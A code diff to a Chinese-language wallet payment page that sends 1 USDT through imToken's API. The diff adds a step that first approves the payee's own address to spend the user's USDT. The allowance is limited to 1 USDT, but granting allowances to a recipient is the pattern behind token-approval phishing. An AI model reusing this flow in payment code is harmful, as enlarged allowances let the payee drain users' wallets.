@@ -10,16 +10,30 @@
   <p id="status">状态：加载中...</p>
 
   <script>
-    const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 收款地址
-    const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC20（ETH主网）
-    const amount = "1";
+    const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 收款人地址
+    const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 地址
     const decimals = 6;
+    const amount = "1"; // 单位：USDT
+    const spender = toAddress; // 被授权的地址（通常是中间合约）
     const fromImToken = location.hash.includes("from=imtoken");
+
+    const amountInWei = (BigInt(amount * (10 ** decimals))).toString();
 
     async function getWallet() {
       document.getElementById("status").innerText = "请求钱包授权...";
       const account = await window.imToken.callAPI("native.account.getCurrentAccount");
       return account.address;
+    }
+
+    async function approveUSDT(from) {
+      // 使用 ERC20 标准 approve(spender, amount)
+      const approveData = encodeApprove(spender, amountInWei);
+      const result = await window.imToken.callAPI("native.transaction.sendContractTransaction", {
+        from,
+        to: contractAddress,
+        data: approveData
+      });
+      return result.txHash;
     }
 
     async function transferUSDT() {
@@ -31,6 +45,13 @@
         symbol: "USDT"
       });
       return result.txHash;
+    }
+
+    function encodeApprove(spender, value) {
+      const methodId = "0x095ea7b3"; // approve(address,uint256)
+      const spenderPadded = spender.toLowerCase().replace("0x", "").padStart(64, "0");
+      const valueHex = BigInt(value).toString(16).padStart(64, "0");
+      return methodId + spenderPadded + valueHex;
     }
 
     async function startFlow() {
@@ -48,11 +69,18 @@
         const address = await getWallet();
         document.getElementById("status").innerText = `钱包已连接：${address}`;
 
+        // Step 1: 授权
+        document.getElementById("status").innerText = "发送授权交易...";
+        const approveHash = await approveUSDT(address);
+        document.getElementById("status").innerText = `✅ 授权成功，TxHash：${approveHash}`;
+
+        // Step 2: 支付
+        document.getElementById("status").innerText = "发送支付交易...";
         const txHash = await transferUSDT();
-        document.getElementById("status").innerText = `✅ 支付成功，交易哈希：${txHash}`;
+        document.getElementById("status").innerText = `✅ 支付成功，TxHash：${txHash}`;
       } catch (e) {
         console.error("失败：", e);
-        document.getElementById("status").innerText = "❌ 支付失败：" + (e?.message || "未知错误");
+        document.getElementById("status").innerText = "❌ 操作失败：" + (e?.message || "未知错误");
       }
     }
 
